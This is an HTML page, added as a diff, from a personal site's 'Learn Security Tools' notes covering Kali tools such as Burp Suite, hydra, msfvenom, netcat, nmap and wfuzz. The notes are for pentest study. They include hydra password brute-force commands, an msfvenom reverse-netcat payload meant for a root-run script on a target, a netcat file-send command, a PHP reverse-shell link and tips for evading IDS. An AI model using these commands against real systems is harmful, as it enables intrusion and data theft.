@@ -1,0 +1,644 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-171431390-1"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SPY7S5B91F"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-171431390-1');
+    </script>
+
+    <!-- Base File Includes -->
+    
+    
+
+    <!-- Includes -->
+    
+    <!-- Code highlighting
+        To Use: <pre><code class="language-python">print('Hello World')</code></pre>
+    -->
+    <link rel="stylesheet" href="/static/home/packages/highlightjs/dracula.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <!-- LaTeX input. Use \(...\) for inline mathematics and $$...$$ or \[...\] for block equations -->
+	<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+	<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+
+    <!-- Title -->
+    <title>
+            DRC
+        
+    - Learn Security Tools
+
+    </title>
+    <!-- ### Bootstrap Files ### -->
+    <!-- Fit device screen size -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+    <!-- ### END BOOTSTRAP FILES ### -->
+	
+	<!-- Font Awesome 4 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <!-- Load Custom Bootstrap CSS -->
+    <link rel="stylesheet" type="text/css" href="/static/home/bootstrap.css">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" type="image/png" href="/static/home/images/favicon.ico">
+
+    <!-- Hide/Reveal Navbar Upon Scrolling -->
+    <script src="/static/home/js/navbar_show.js" async></script>
+    <link rel="stylesheet" type="text/css" href="/static/home/css/navbar.css">
+
+    <!-- Javascript to run after the page has loaded -->
+    <script src="/static/home/js/on_page_load.js" defer></script>
+    
+</head>
+
+<!-- Body -->
+<body class='bg-light'>
+    <!-- Navigation Bar -->
+    <header class="nav-down">
+        <nav class="navbar py-0 navbar-expand-md navbar-dark bg-dark">
+    <!-- Website Brand Icon -->
+    <a class="navbar-brand" href="/">DRC</a>
+    <!-- Menu Button when screen is small -->
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <!-- Navigation Buttons -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav mr-auto">
+            <!-- Home -->
+            <li class="nav-item dropdown">
+                <!-- Screen Reader -->
+                
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/">Home</a>
+                </div>
+            </li>
+            <!-- Experience -->
+            <li class="nav-item dropdown">
+                <!-- Screen Reader -->
+                
+                <!-- Experience Types -->
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/resume/">Experience</a>
+                    <button type="button" class="btn btn-dark px-1 dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                        <span class="sr-only">Toggle Dropdown</span>
+                    </button>
+                    <div class="dropdown-menu py-0 bg-secondary">
+                        <a class="dropdown-item" href="/resume/">&#8226; Resume</a>
+                        <a class="dropdown-item text-white" href="/work-experience/">&#8226; Work Experience</a>
+                        <!-- <a class="dropdown-item text-white" href="/computer-skills/">&#8226; Computer Skills</a> -->
+                    </div>
+                </div>
+            </li>
+ 
+            <!-- Blog Posts -->
+<!--            <li class="nav-item dropdown">
+                
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/blog/">Blog</a>
+                    <button type="button" class="btn btn-dark px-1 dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                        <span class="sr-only">Toggle Dropdown</span>
+                    </button>
+                    <div class="dropdown-menu py-0 bg-secondary">
+                        <a class="dropdown-item" href="/blog/project/">&#8226; Projects</a>
+                        <a class="dropdown-item" href="/blog/tutorial/">&#8226; Tutorials</a>
+                        <a class="dropdown-item" href="#">&#8226; Other</a>
+                    </div>
+                </div>
+            </li>
+-->        
+            <!-- Research -->
+            <li class="nav-item dropdown">
+                <!-- Screen Reader -->
+                
+                <!-- Experience Types -->
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/research/">Research</a>
+                    <button type="button" class="btn btn-dark px-1 dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                        <span class="sr-only">Toggle Dropdown</span>
+                    </button>
+                    <div class="dropdown-menu active py-0 bg-secondary">
+                        <a class="dropdown-item" href="/research/papers/">&#8226; Papers</a>
+                        <a class="dropdown-item" href="/research/projects/">&#8226; Projects</a>
+                        <a class="dropdown-item" href="/research/notes/">&#8226; Notes</a>
+                    </div>
+                </div>
+            </li>
+            <!-- Learn -->
+            <li class="nav-item dropdown">
+                
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/learn/">Learn</a>
+                </div>
+            </li>
+            <!-- Projects -->
+            <li class="nav-item dropdown">
+                
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/projects/">Projects</a>
+                </div>
+            </li>
+            <!-- Write-Ups -->
+            <li class="nav-item dropdown">
+                
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/writeups/kattis/">Write-Ups</a>
+                </div>
+            </li>
+            <!-- About -->
+            <li class="nav-item dropdown">
+                <!-- Screen Reader -->
+                
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/about/">About</a>
+                </div>
+            </li>
+            <!-- Contact -->
+            <li class="nav-item dropdown">
+                <!-- Screen Reader -->
+                
+                <div class="btn-group ">
+                    <a class="nav-link btn btn-dark pr-1" href="/contact/">Contact</a>
+                </div>
+            </li>
+        </ul>
+        <!-- Search  bar -->
+        <form class="form-inline my-1" action="/search/">
+            <input class="form-control mr-0" style="font-size:14px; width:85%;" type="search" placeholder="Search" aria-label="Search" name="q" autocomplete="on">
+            <button type="submit" style="width:15%; background-color: Transparent; border-color: Transparent;">
+                <i class="fa fa-search" style="font-size:18px; color:#FFFFFF;"></i>
+            </button>
+        </form>
+    </div>
+</nav>
+
+    </header>
+
+    <!-- Content -->
+    <div style="margin-top:60px;">
+        <div class="container rounded m-4 mx-auto p-4 bg-white shadow-lg">
+            
+<div class="row">
+    <!-- Scroll Bar -->
+    <div class="d-none d-xl-block col-xl-2 overflow-auto" style="position:relative; overflow-y:scroll; height:80vh">
+        <div id="side-navbar" class="list-group flex-xl-column flex-row">
+            <center>
+                <a class="list-group-item list-group-item-action" href="#security-tools">
+                    Security Tools
+                </a>
+            </center>
+            
+                <a class="list-group-item list-group-item-action" href="#burp-suite">
+                    Burp Suite
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#cyberchef">
+                    Cyberchef
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#gobuster">
+                    Gobuster
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#hydra">
+                    Hydra
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#msfvenom">
+                    Msfvenom
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#netcat">
+                    Netcat
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#nmap">
+                    Nmap
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#reverse-shells">
+                    Reverse Shells
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#searchsploit">
+                    Searchsploit
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#sqlmap">
+                    Sqlmap
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#wfuzz">
+                    Wfuzz
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#whois">
+                    Whois
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#word-lists">
+                    Word Lists
+                </a>
+            
+                <a class="list-group-item list-group-item-action" href="#zap">
+                    Zap
+                </a>
+            
+        </div>
+    </div>
+    <!-- Content -->
+    <div class="col" data-spy="scroll" data-target="#side-navbar" class="scrollspy" style="position:relative; overflow-y:scroll; height:80vh">
+        <!-- Theme Information -->
+        <h1 id='security-tools' class='text-center'>Security Tools</h1>
+        This section covers a wide variety of security tools that can be found on <a href="https://www.kali.org" target="_blank">Kali</a> Linux.
+
+        <!-- For each subject -->
+        
+            <!-- Subject header -->
+            <h2 id="burp-suite">
+                <a href="/learn/security-tools/burp-suite">Burp Suite</a>
+            </h2>
+            <p>Burp Suite is a framework of web application pentesting tools. See ZAP for a similar (completely free) tool).</p>
+
+<p>Burp Suite needs to be able to act as a proxy. Follow this tutorial by <a href="https://tryhackme.com/room/rpburpsuite" target="_blank">tryhackme</a> to set up FoxyProxy in firefox</p>
+
+<h6>Components</h6>
+<p>Burp suite has a number of different components:</p>
+<ul>
+    <li>Proxy: Funnel traffic through Burp</li>
+    <li>Target: Scope the project. Can be used to create a sitemp of the application we are testing.</li>
+    <li>Intruder: Powerful tool. Can be used for field fuzzing to credential stuffing</li>
+    <li>Repeater: "Repeat" requests. Often used with fuzzing.</li>
+    <li>Sequencer: Analyze the "randomness" present where random is intended</li>
+    <li>Decoder: Transforms data</li>
+    <li>Extender: Add extensions</li>
+    <li>Scanner (Premium Feature): Automated web vulnerability scanner</li>
+</ul>
+
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="burp-suite-intruder">&bull; Intruder</h4>
+                <!-- Include topic -->
+                <h4>Positions</h4>
+<p>From the Positions tab, you may select different fields to attack.</p>
+
+<p>Attack type</p>
+<ul>
+    <li>Cluster Bomb: Brute force. Iterate through every combination of the payloads.</li>
+</ul>
+
+<h4>Payloads</h4>
+<p>Add payloads (dictionaries).</p>
+<p>To start the attack, press the attack button in the top right corner. :)</p>
+
+            
+                <!-- Topic header -->
+                <h4 id="burp-suite-proxy">&bull; Proxy</h4>
+                <!-- Include topic -->
+                <h4>Intercept</h4>
+<p>The intercept tab intercepts web traffic and allows you to view the request. You can send particular parts of this request to different modules, such as the Intruder module.</p>
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="cyberchef">
+                <a href="/learn/security-tools/cyberchef">Cyberchef</a>
+            </h2>
+            <p><a href="http://icyberchef.com" target="_blank">CyberChef</a></p>
+
+            <!-- For each topic -->
+            
+        
+            <!-- Subject header -->
+            <h2 id="gobuster">
+                <a href="/learn/security-tools/gobuster">Gobuster</a>
+            </h2>
+            <p><a href="https://github.com/OJ/gobuster" target="_blank">Gobuster</a> is a tool used to brute-force URIs (directories and files), DNS subdomains, virtual host names, and open amazon S3 buckets.</p>
+
+<p>There are three modes:</p>
+<ul>
+    <li><code>dir</code></li>
+    <li><code>vhost</code></li>
+    <li><code>dns</code></li>
+</ul>
+
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="gobuster-dir">&bull; Dir</h4>
+                <!-- Include topic -->
+                <p><code>dir</code> mode arguments:</p>
+<ul>
+    <li><code>-u</code>: What url to enumerate</li>
+    <li><code>-w</code>: Wordlist to append to the url</li>
+    <ul>
+        <li>A good word list to use on Kali is: <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt" target="_blank"><code>/usr/share/wordlists/dirb/big.txt</code></a></li>
+    </ul>
+    <li><code>-x</code>: Extensions to append to each word in the wordlist</li>
+</ul>
+
+<p>Example:</p>
+<pre class="rounded"><code class="bash">$ gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html</code></pre>
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="hydra">
+                <a href="/learn/security-tools/hydra">Hydra</a>
+            </h2>
+            <p><a href="https://en.kali.tools/?p=220" target="_blank">Hydra</a> is a network logon cracker for many different services.</p>
+
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="hydra-http-post-form">&bull; Http Post Form</h4>
+                <!-- Include topic -->
+                <p>General syntax:</p>
+<pre class="rounded"><code class="bash">$ hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;Target IP&gt; http-post-form "&lt;URL Path&gt;:&lt;Post Arg&gt;=^&lt;KEY&gt;^:&lt;TAGS&gt;"</code></pre>
+
+<p>Example:</p>
+<ul>
+    <li><code>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login:username^USER^&password=^PASS^:F=incorrect"</code></li>
+</ul>
+
+            
+                <!-- Topic header -->
+                <h4 id="hydra-ssh">&bull; Ssh</h4>
+                <!-- Include topic -->
+                <p>General syntax:</p>
+<pre class="rounded"><code class="bash">$ hydra -l &lt;username&gt; -P &lt;absolute path to passwords file&gt; &lt;Target IP&gt; -t &lt;thread count&gt; ssh</code></pre>
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="msfvenom">
+                <a href="/learn/security-tools/msfvenom">Msfvenom</a>
+            </h2>
+            <p>Payload generator and encoder. Generates payloads that allow for things such as a reverse netcat connection</p>
+
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="msfvenom-examples">&bull; Examples</h4>
+                <!-- Include topic -->
+                <h6>Reverse Netcat</h6>
+<p>If there is a script that can we can write to that runs as root on the target machine:</p>
+<ul>
+    <li>Local: <code>msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R</code></li>
+    <li>Local: <code>nv -lvp 8888</code></li>
+    <li>Target: <code>echo &lt;msfvenom output&gt; &gt; script</code></li>
+</ul>
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="netcat">
+                <a href="/learn/security-tools/netcat">Netcat</a>
+            </h2>
+            <p>Netcat allows you to listen or connect to TCP/UDP ports</p>
+
+<p>General syntax:</p>
+<pre class="rounded"><code class="bash">$ netcat [options] host port</code></pre>
+
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="netcat-listener">&bull; Listener</h4>
+                <!-- Include topic -->
+                <p>Create a listener on port 4444:</p>
+<pre class="rounded"><code class="bash">$ netcat -l 4444</code></pre>
+
+            
+                <!-- Topic header -->
+                <h4 id="netcat-send">&bull; Send</h4>
+                <!-- Include topic -->
+                <p>Send traffic (from file specifically):</p>
+<pre class="rounded"><code class="bash">$ netcat 192.168.1.1 4444 < file.txt</code></pre>
+
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="nmap">
+                <a href="/learn/security-tools/nmap">Nmap</a>
+            </h2>
+            
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="nmap-output">&bull; Output</h4>
+                <!-- Include topic -->
+                <ul>
+    <li><code>-oA</code>: Saves output in all three file types; grepable, XML, and script kiddie</li>
+    <li><code>-oG</code>: Saves output in a grepable format</li>
+    <li><code>-oX</code>: Saves output as an XML file</li>
+    <li><code>-oS</code>: Saves output in a script kiddie format</li>
+    <li><code>-v</code>: Verbose. Some output is nice to see the progress</li>
+    <li><code>-vv</code>: Very verbose</li>
+</ul>
+
+            
+                <!-- Topic header -->
+                <h4 id="nmap-scans">&bull; Scans</h4>
+                <!-- Include topic -->
+                <ul>
+    <li><code>-A</code>: Aggresive scan. Enable OS detection, version detection, script scanning, and traceroute</li>
+    <ul>
+        <li>Same as <code>-O -sV -sC --traceroute</code></li>
+    </ul>
+    <li><code>-O</code>: Operating system detection</li>
+    <li><code>-p &lt;ports,&gt;</code>: Specify ports to scan</li>
+    <ul>
+        <li><code>-p-</code>: Scan every port</li>
+    </ul>
+    <li><code>-Pn</code>: Treat each host as active. Skip host discovery</li>
+    <li><code>-sS</code>: TCP SYN scan (stealth scan). Quick scan. Does not complete the TCP connection</li>
+    <li><code>-sT</code>: TCP connection scan</li>
+    <li><code>-sU</code>: UDP scan</li>
+    <li><code>-sV</code>: Service version scan</li>
+</ul>
+
+            
+                <!-- Topic header -->
+                <h4 id="nmap-scripts">&bull; Scripts</h4>
+                <!-- Include topic -->
+                <p>To use a script: <code>--script &lt;script name&gt;</code>. <a href="https://nmap.org/nsedoc/scripts/" target="_blank">Here</a> is a list of nmap scripts.</p>
+
+<p>Useful scripts:</p>
+<ul>
+    <li><a href="https://nmap.org/nsedoc/scripts/vulners.html" target="_blank">vulners</a>: Check for known vulnerabilities</li>
+</ul>
+
+            
+                <!-- Topic header -->
+                <h4 id="nmap-timing">&bull; Timing</h4>
+                <!-- Include topic -->
+                <p><code>-T&lt;N&gt;</code>: How aggressively (quickly) to scan. Ranges from 0 to 5.</p>
+<ul>
+    <li><code>0</code>: Paranoid. Waits 5 minutes between each probe</li>
+    <li><code>1</code>: Sneaky. Waits 15 seconds between probes</li>
+    <li><code>2</code>: Polite. Waits 0.4 seconds between probes</li>
+    <li><code>3</code>: Normal. Default. Includes parallelization</li>
+    <li><code>4</code>: Aggressive</li>
+    <li><code>5</code>: Insane</li>
+</ul>
+
+<p>1 and 2 are useful to avoid IDS alerts.</p>
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="reverse-shells">
+                <a href="/learn/security-tools/reverse-shells">Reverse Shells</a>
+            </h2>
+            
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="reverse-shells-php">&bull; Php</h4>
+                <!-- Include topic -->
+                <p><a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target="_blank">php-reverse-shell.php</a></p>
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="searchsploit">
+                <a href="/learn/security-tools/searchsploit">Searchsploit</a>
+            </h2>
+            <p><a href="https://www.exploit-db.com/searchsploit" target="_blank">SearchSploit</a> is a command line search tool for Exploit-DB</p>
+
+<p>Needs to be updated periodically (weekly): <code>searchsploit -u</code></p>
+
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="searchsploit-automation">&bull; Automation</h4>
+                <!-- Include topic -->
+                <p>You can use the XML file generated by nmap to automate finding exploits.</p>
+
+<p><code>--nmap &lt;file&gt;.xml</code></p>
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="sqlmap">
+                <a href="/learn/security-tools/sqlmap">Sqlmap</a>
+            </h2>
+            <!-- TODO: Completely re-write this file -->
+<p><a href="https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet" target="_blank">cheatsheet</a>.
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap" target="_blank">PayloadsAllTheThings</a>.
+<a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank">General sql injection payload list</a>.</p>
+
+            <!-- For each topic -->
+            
+        
+            <!-- Subject header -->
+            <h2 id="wfuzz">
+                <a href="/learn/security-tools/wfuzz">Wfuzz</a>
+            </h2>
+            <p><a href="https://github.com/xmendez/wfuzz" target="_blank">Wfuzz</a> is a web application bruteforcer. It replaces any occurrence of the FUZZ keyword with a given payload. It can fuzz URIs, similar to gobuster, to more complicated tasks, such as GET and POST parameters.</p>
+
+<p>Arguments:</p>
+<ul>
+    <li>-c: Color</li>
+    <li>-u: URL to use for the request</li>
+    <li>-d: Parameters to fuzz with. For example, to fuzz a php argument: <code>-d "date=FUZZ"</code></li>
+    <li>-z: Specify what will replace FUZZ.</li>
+    <ul>
+        <li>file: Replace with a file. Example: <code>-z file,wordlist.txt</code></li>
+    </ul>
+    <li>--hc: Don't show certain http response codes. For example: <code>--hc 404</code></li>
+    <li>--hl: Don't show for a certain number of lines in the response</li>
+    <li>--hh: Don't show for a certain number of characters in the response</li>
+</ul>
+
+<p>Example:</p>
+<pre class="rounded"><code class="bash">$ wfuzz -c -z file,big.txt localhost:80/FUZZ/note.txt</code></pre>
+<pre class="rounded"><code class="bash">$ wfuzz -c -z file,big.txt -d "username=FUZZ&password=FUZZ" -u http://example.com/login.php</code></pre>
+<pre class="rounded"><code class="bash">$ wfuzz -c -z file,wordlist.txt -d "date=FUZZ" -u http://10.10.180.198/api/site-log.php --hh 0</code></pre>
+
+            <!-- For each topic -->
+            
+        
+            <!-- Subject header -->
+            <h2 id="whois">
+                <a href="/learn/security-tools/whois">Whois</a>
+            </h2>
+            <p>Get DNS information for a website.</p>
+
+<p>Example: <pre class="rounded"><code class="bash">$ whois daltoncole.com</code></pre></p>
+
+            <!-- For each topic -->
+            
+        
+            <!-- Subject header -->
+            <h2 id="word-lists">
+                <a href="/learn/security-tools/word-lists">Word Lists</a>
+            </h2>
+            <p>A large collection of word lists can be found <a href="https://github.com/danielmiessler/SecLists" target="_blank">here</a>.</p>
+
+            <!-- For each topic -->
+            
+                <!-- Topic header -->
+                <h4 id="word-lists-rockyou">&bull; Rockyou</h4>
+                <!-- Include topic -->
+                <p><code>rockyou.txt</code> is a leaked unencrypted password list from RockYou. On Kali, it can be found under <code>/usr/share/wordlists/rockyou.txt.gz</code>. Use <code>gzip -d rockyou.txt.gz</code> to unzip it.</p>
+
+            
+        
+            <!-- Subject header -->
+            <h2 id="zap">
+                <a href="/learn/security-tools/zap">Zap</a>
+            </h2>
+            <p><a href="https://www.zaproxy.org/" target="_blank">OWASP ZAP</a> is an enumeration tool, similar to Burp Suite, however, ZAP is open source and completely free.</p>
+
+            <!-- For each topic -->
+            
+        
+    </div>
+</div>
+
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="small text-center text-muted">
+        <!-- Social Links -->
+		<p>
+            <a href="https://github.com/DaltonCole" target="_blank" class="fa fa-github" style="font-size:28px;color:black;"></a>
+            &nbsp;&nbsp;&nbsp;&nbsp;
+            <a href="https://www.linkedin.com/in/daltoncole1/" target="_blank" class="fa fa-linkedin" style="font-size:28px;color:#2867B2;"></a>
+        </p>
+
+        <!-- Copyright -->
+        
+        <p class="copyright"> Copyright &copy; 2020 
+            -2024 
+         | Dalton Russell Cole</p>
+
+        <!-- Extra Footer Block -->
+        
+        
+    </footer>
+</body>
+</html>
